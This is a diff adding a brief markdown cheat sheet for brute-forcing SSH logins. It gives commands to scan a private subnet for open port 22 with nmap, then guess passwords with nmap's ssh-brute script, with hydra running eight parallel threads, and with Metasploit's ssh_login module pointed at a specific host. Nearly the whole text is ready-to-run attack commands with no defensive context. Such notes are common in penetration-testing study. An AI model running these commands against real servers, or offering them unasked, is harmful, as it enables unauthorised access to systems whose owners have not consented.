@@ -1,0 +1,16 @@
+### brute force ssh
+	1: use nmap
+		nmap 192.168.1.0/24 -p 22 # searching for ip have port 22: open
+		nmap 192.168.100.142 -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=pass.txt
+	2: use hydra
+		hydra -L user.txt -P pass.txt ssh://localhost -t 8
+			# -t 8: 8 thread parallel for much faster
+	3: use metasploit
+		search ssh 
+		use auxiliary/scanner/ssh/ssh_login
+		set rhosts 192.168.100.142
+		set stop_on_success true
+		set user_file user.txt
+		set pass_file pass.txt
+		set verbose true
+		run
